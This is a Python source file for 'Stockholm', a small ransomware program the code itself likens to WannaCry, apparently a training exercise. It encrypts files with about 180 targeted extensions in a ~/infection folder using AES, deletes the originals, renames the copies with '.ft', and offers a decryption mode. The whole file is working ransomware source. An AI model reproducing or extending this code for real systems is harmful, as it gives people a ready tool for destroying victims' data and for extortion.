import argparse
import os
from dotenv import load_dotenv
import base64
import hashlib
import pyAesCrypt

load_dotenv()

DIRECTORY = os.path.expanduser("~/infection")
EXTENSIONS = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
    ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",
    ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php",
    ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
    ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
    ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd",
    ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
    ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
    ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1",
    ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg",
    ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm",
    ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
    ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
]
BUFFERSIZE=64 * 1024


def infection(file):
    try:
        with open(file, "rb") as f_in:
            with open(file + ".ft", "wb") as f_out:
                pyAesCrypt.encryptStream(f_in, f_out, os.getenv("KEY"), BUFFERSIZE)
                os.remove(file)
    except FileNotFoundError:
        print(f"File not found: {file}")
    except PermissionError:
        print(f"Permission denied: {file}")
    except Exception as e:
        print(f"Error encrypting {file}: {str(e)}")

def reverse(file, key):
    try:
        with open(file, "rb") as f_in:
            with open(file[:-3], "wb") as f_out:
                pyAesCrypt.decryptStream(f_in, f_out, key, BUFFERSIZE)
                os.remove(file)
    except:
        print(f"Error decrypting {file}")

def main():
    if not os.path.isdir(DIRECTORY):
        print(f"Directory {DIRECTORY} does not exist.")
        exit(1)
    parser = argparse.ArgumentParser(description="Stockholm is a shitty version of wannacry")
    parser.add_argument("-v", "--version",action='version', version='Stockholm 0.0.1', help="Show program's version number and exit")
    parser.add_argument("-r", "--reverse", type=str, metavar='KEY', 
                        help="Reverse the infection using the provided key")
    parser.add_argument("-s", "--silent", action="store_true", help="Silent mode")

    args = parser.parse_args()
    if args.reverse:
        print("Reversing the infection process...")
        for file in os.listdir(DIRECTORY):
            if file.endswith(".ft"):
                file_path = os.path.join(DIRECTORY, file)
                reverse(file_path, args.reverse)
    else:
        if os.getenv("KEY") is None or len(os.getenv("KEY")) < 16:
            print("Please provide a key of at least 16 characters")
            exit(1)
        for file in os.listdir(DIRECTORY):
            if file.endswith(tuple(EXTENSIONS)):
                file_path = os.path.join(DIRECTORY, file)
                infection(file_path)
                if not args.silent:
                    print(f"Encrypted: {file}")
            


if __name__ == "__main__":
    main()